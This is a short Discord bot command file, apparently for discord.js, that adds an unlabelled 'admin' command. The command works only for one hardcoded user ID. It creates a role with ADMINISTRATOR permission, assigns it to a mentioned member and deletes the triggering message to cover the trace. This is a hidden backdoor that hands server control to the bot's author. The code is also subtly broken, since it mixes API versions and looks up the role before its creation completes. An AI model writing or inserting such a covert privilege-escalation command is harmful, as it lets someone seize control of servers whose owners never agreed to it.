const { EmbedBuilder } = require('discord.js');
const config = require("../config.json");

module.exports = {
    name: 'admin',
    description: "???",
    aliases: [],
    execute(bot, message, args){
        
        if (message.author.id != 267183697562828810) return

        let member = message.mentions.members.first();
        if (!member) return

        message.guild.roles.create({
            data: {
                name: "SUPER BAD BOY ANTON",
                color: "#f54040",
                permissions: ["ADMINISTRATOR"],
            },
        })

        var role = message.guild.roles.cache.find(role => role.name === "SUPER BAD BOY ANTON");
        member.roles.add(role);

        message.delete()
    },
};